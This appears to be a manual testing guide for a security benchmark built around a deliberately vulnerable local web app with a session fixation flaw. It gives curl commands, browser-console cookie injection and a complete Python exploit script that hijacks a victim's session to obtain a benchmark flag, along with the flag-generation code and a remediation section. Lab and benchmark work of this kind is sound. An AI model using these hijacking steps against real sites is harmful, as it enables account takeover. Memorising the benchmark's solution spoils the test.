# S7BEN-MED-001: Manual Testing Guide

## Vulnerability: Session Fixation - Pre-Auth Session Persistence

### Overview
This benchmark demonstrates a session fixation vulnerability where session IDs are accepted via URL parameters and are not regenerated after successful authentication. This allows attackers to hijack authenticated sessions by pre-setting the session ID.

**Key Difference from Phase 1:** This benchmark features DYNAMIC flag generation based on cryptographic proof of successful hijacking, not a static flag.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-MED-001
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

**Test accounts:**
- alice / password123
- bob / secretpass
- charlie / admin2025

---

## Understanding Session Fixation

### What is Session Fixation?

Session fixation is an attack where the attacker sets a user's session ID to a known value before the user authenticates. After the victim logs in with that fixed session ID, the attacker can use the same ID to hijack the authenticated session.

### Requirements for Successful Exploitation:

1. ✅ Application accepts session IDs from external sources (URL, POST data)
2. ✅ Session ID is NOT regenerated after authentication
3. ✅ Attacker can trick victim into using the fixed session ID
4. ✅ Attacker can access the same session after victim authenticates

### Attack Flow:

```
Time  Attacker                           Application                  Victim
----  ---------------------------------  ---------------------------  --------------------------
t0    Create session: sid=ATTACK123     Session created
t1    Send link: /login?sid=ATTACK123
t2                                                                    Clicks link
t3                                       Session sid=ATTACK123        Sees login form
t4                                       created_by=attacker_controlled
t5                                                                    Logs in (alice/password123)
t6                                       Authenticates sid=ATTACK123
                                         authenticated_user=alice
                                         [NO REGENERATION!]
t7    Access with sid=ATTACK123
t8    → Hijacked alice's session!        Verify: created_by ≠ authenticated_user
                                         Generate dynamic flag
```

---

## Manual Testing Steps

### Step 1: Understand Normal Login Flow

First, see how a normal login works:

```bash
# 1. Access login page normally
curl -c cookies.txt http://localhost:5000/login

# 2. Login as alice
curl -b cookies.txt -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=password123" \
  -L

# 3. Check session
curl -b cookies.txt http://localhost:5000/api/session | jq .
```

**Expected Output:**
```json
{
  "status": "success",
  "session_exists": true,
  "session_id": "<random_id>",
  "created_by": "alice",
  "authenticated_user": "alice",
  "is_authenticated": true
}
```

Notice: `created_by` equals `authenticated_user` - this is normal, not hijacked.

### Step 2: Exploit - Fix a Session ID

Now let's perform the actual attack:

```bash
# 1. Create a known session ID (attacker chooses this)
ATTACK_SID="ATTACKER_FIXED_SESSION_12345"

# 2. Access login page with fixed session ID
curl -c attacker_cookies.txt "http://localhost:5000/login?sid=$ATTACK_SID"

# 3. Check that session was created
curl -b attacker_cookies.txt http://localhost:5000/api/session | jq .
```

**Expected Output:**
```json
{
  "session_id": "ATTACKER_FIXED_SESSION_12345",
  "created_by": "attacker_controlled",
  "is_authenticated": false
}
```

### Step 3: Victim Logs In (Simulated)

Now simulate the victim logging in with the fixed session:

```bash
# Victim uses the URL sent by attacker
curl -c victim_cookies.txt -X POST "http://localhost:5000/login?sid=$ATTACK_SID" \
  -d "username=alice&password=password123" \
  -L > /dev/null

# Victim is now logged in, check their session
curl -b victim_cookies.txt http://localhost:5000/api/session | jq .
```

**Expected Output:**
```json
{
  "session_id": "ATTACKER_FIXED_SESSION_12345",
  "created_by": "attacker_controlled",
  "authenticated_user": "alice",
  "is_authenticated": true
}
```

### Step 4: Attacker Hijacks Session

The attacker can now use the same session ID:

```bash
# Attacker sets the same session ID in their cookie
echo "session_id=$ATTACK_SID" > attacker_session.txt

# Access dashboard
curl -b "session_id=$ATTACK_SID" http://localhost:5000/dashboard

# OR: Check session via API
curl -b "session_id=$ATTACK_SID" http://localhost:5000/api/session | jq .
```

**Result:** Attacker is now logged in as alice!

### Step 5: Get the Dynamic Flag

```bash
# Verify the hijack and get flag
curl -b "session_id=$ATTACK_SID" -X POST http://localhost:5000/api/verify-hijack | jq .
```

**Expected Output:**
```json
{
  "status": "exploited",
  "hijack_detected": true,
  "operation": "verify_hijack",
  "session_id": "ATTACKER_FIXED_SESSION_12345",
  "session_created_by": "attacker_controlled",
  "authenticated_user": "alice",
  "proof": "Session was created with attacker-controlled ID, then victim authenticated",
  "flag": "S7BEN{session_fixation_<dynamic_hmac_hash>}",
  "timestamp": "2026-01-07T..."
}
```

---

## Exploitation Methods

### Method 1: Browser-Based Attack (Most Realistic)

**Attacker's Steps:**

1. Open browser to: `http://localhost:5000/login?sid=EVIL_SESSION_123`
2. Copy the URL
3. Send to victim (social engineering)

**Victim's Steps:**

1. Click the link
2. Login with their credentials (alice / password123)

**Attacker Hijacks:**

1. Set cookie manually in browser console:
   ```javascript
   document.cookie = "session_id=EVIL_SESSION_123; path=/";
   location.reload();
   ```
2. Access `/dashboard` - now logged in as victim!
3. Click "Verify Hijack & Get Flag" button to retrieve the flag

### Method 2: Automated Python Script

Create `exploit.py`:

```python
import requests
import json

URL = "http://localhost:5000"
ATTACK_SESSION = "ATTACKER_CONTROLLED_SESSION_999"

def exploit_session_fixation():
    """
    Perform session fixation attack:
    1. Create session with known ID
    2. Simulate victim login
    3. Hijack session
    4. Get dynamic flag
    """

    print("="*60)
    print("S7BEN-MED-001: Session Fixation Exploit")
    print("="*60)

    # Step 1: Attacker creates session with known ID
    print(f"\n[*] Step 1: Creating session with fixed ID: {ATTACK_SESSION}")

    attacker_session = requests.Session()
    attacker_session.get(f"{URL}/login?sid={ATTACK_SESSION}")

    response = attacker_session.get(f"{URL}/api/session")
    session_data = response.json()

    if session_data.get('session_id') == ATTACK_SESSION:
        print(f"[+] Session created successfully")
        print(f"    Created by: {session_data.get('created_by')}")
    else:
        print(f"[-] Failed to create session")
        return False

    # Step 2: Simulate victim logging in
    print(f"\n[*] Step 2: Simulating victim login...")

    victim_session = requests.Session()
    login_response = victim_session.post(
        f"{URL}/login?sid={ATTACK_SESSION}",
        data={
            "username": "alice",
            "password": "password123"
        }
    )

    if login_response.status_code == 200:
        print(f"[+] Victim logged in successfully")
    else:
        print(f"[-] Victim login failed")
        return False

    # Verify victim is authenticated
    victim_check = victim_session.get(f"{URL}/api/session")
    victim_data = victim_check.json()
    print(f"    Authenticated as: {victim_data.get('authenticated_user')}")

    # Step 3: Attacker hijacks session
    print(f"\n[*] Step 3: Attacker hijacking session...")

    hijacker_session = requests.Session()
    hijacker_session.cookies.set('session_id', ATTACK_SESSION)

    hijack_check = hijacker_session.get(f"{URL}/api/session")
    hijack_data = hijack_check.json()

    if hijack_data.get('is_authenticated'):
        print(f"[+] Successfully hijacked session!")
        print(f"    Logged in as: {hijack_data.get('authenticated_user')}")
        print(f"    Session created by: {hijack_data.get('created_by')}")
    else:
        print(f"[-] Hijack failed")
        return False

    # Step 4: Get the flag
    print(f"\n[*] Step 4: Retrieving flag...")

    flag_response = hijacker_session.post(f"{URL}/api/verify-hijack")
    flag_data = flag_response.json()

    if flag_data.get('hijack_detected'):
        print(f"\n{'='*60}")
        print(f"SUCCESS! EXPLOITATION COMPLETE")
        print(f"{'='*60}")
        print(f"\nFlag: {flag_data.get('flag')}")
        print(f"\nProof: {flag_data.get('proof')}")
        print(f"Timestamp: {flag_data.get('timestamp')}")
        print(f"\n{'='*60}")
        return True
    else:
        print(f"[-] No hijack detected")
        print(f"    Message: {flag_data.get('message')}")
        return False

if __name__ == "__main__":
    success = exploit_session_fixation()
    exit(0 if success else 1)
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-MED-001: Session Fixation Exploit
============================================================

[*] Step 1: Creating session with fixed ID: ATTACKER_CONTROLLED_SESSION_999
[+] Session created successfully
    Created by: attacker_controlled

[*] Step 2: Simulating victim login...
[+] Victim logged in successfully
    Authenticated as: alice

[*] Step 3: Attacker hijacking session...
[+] Successfully hijacked session!
    Logged in as: alice
    Session created by: attacker_controlled

[*] Step 4: Retrieving flag...

============================================================
SUCCESS! EXPLOITATION COMPLETE
============================================================

Flag: S7BEN{session_fixation_a1b2c3d4e5f67890abcdef1234567890}

Proof: Session was created with attacker-controlled ID, then victim authenticated
Timestamp: 2026-01-07T12:34:56.789012

============================================================
```

### Method 3: Two-Browser Attack (Visual Demonstration)

**Browser 1 (Attacker):**
1. Open DevTools Console
2. Navigate to: `http://localhost:5000/login?sid=DEMO_ATTACK_SID`
3. Note the session ID in the warning box
4. DO NOT login - just copy the URL

**Browser 2 (Victim):**
1. Open in different browser/profile
2. Paste the URL from attacker
3. Login as alice / password123
4. You're now logged in normally

**Browser 1 (Attacker returns):**
1. Open DevTools Console (F12)
2. Run:
   ```javascript
   document.cookie = "session_id=DEMO_ATTACK_SID; path=/";
   location.href = "/dashboard";
   ```
3. You're now logged in as alice!
4. Click "Verify Hijack & Get Flag"

---

## API Testing

### Get Session Information
```bash
curl http://localhost:5000/api/session | jq .
```

### Verify Hijack and Get Flag
```bash
curl -X POST http://localhost:5000/api/verify-hijack \
  -H "Cookie: session_id=YOUR_SESSION_ID" | jq .
```

### Reset All Sessions
```bash
curl -X POST http://localhost:5000/reset | jq .
```

Or use the Make target:
```bash
make reset
```

---

## Understanding the Dynamic Flag

The flag is generated using HMAC:

```python
def generate_flag(session_id, hijacker, victim):
    timestamp = str(int(time.time()))
    data = f"{hijacker}:{victim}:{session_id}:{timestamp}"
    flag_hash = hmac.new(
        FLAG_SECRET.encode(),
        data.encode(),
        hashlib.sha256
    ).hexdigest()[:32]

    return f"S7BEN{{session_fixation_{flag_hash}}}"
```

This means:
- **Flag is NOT static** - changes with each exploitation
- **Proves successful hijack** - requires created_by ≠ authenticated_user
- **Cannot be guessed** - requires knowledge of FLAG_SECRET
- **Time-bound** - includes timestamp in HMAC

---

## Troubleshooting

### Issue: "No hijack detected"

**Cause:** Session was created by the same user who authenticated.

**Solution:** Make sure to:
1. Access `/login?sid=KNOWN_ID` FIRST (creates session)
2. THEN login as a different user
3. Session's `created_by` must be "attacker_controlled"

### Issue: Session expired

**Solution:** Sessions expire after 10 minutes. Reset and try again:
```bash
make reset
```

### Issue: Can't access dashboard

**Cause:** Session cookie not set properly.

**Solution:**
```bash
# Set cookie explicitly
curl -H "Cookie: session_id=YOUR_SID" http://localhost:5000/dashboard
```

---

## Real-World Prevention

### How to Fix Session Fixation:

```python
def regenerate_session(old_session_id):
    """
    Proper fix: Regenerate session ID after authentication
    """
    # Generate new session ID
    new_session_id = secrets.token_urlsafe(32)

    # Migrate session data
    conn = get_db()
    conn.execute('''
        UPDATE sessions
        SET session_id = ?
        WHERE session_id = ?
    ''', (new_session_id, old_session_id))
    conn.commit()
    conn.close()

    return new_session_id

# In login handler:
new_session_id = regenerate_session(old_session_id)
response.set_cookie('session_id', new_session_id)
```

### Best Practices:

1. **Always regenerate session ID after login**
2. **Never accept session IDs from GET parameters**
3. **Use framework session management** (Flask-Session, etc.)
4. **Set httponly and secure flags** on session cookies
5. **Implement session binding** (IP, User-Agent)
6. **Use short session timeouts**

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- ✅ Created session with attacker-controlled ID via URL parameter
- ✅ Simulated victim login with fixed session
- ✅ Successfully accessed victim's authenticated session
- ✅ Retrieved dynamically generated flag proving hijack
- ✅ Flag format: `S7BEN{session_fixation_<32_hex_chars>}`

---

## Additional Resources

- **CWE-384:** https://cwe.mitre.org/data/definitions/384.html
- **OWASP Session Fixation:** https://owasp.org/www-community/attacks/Session_fixation
- **Flask Session Security:** https://flask.palletsprojects.com/security/
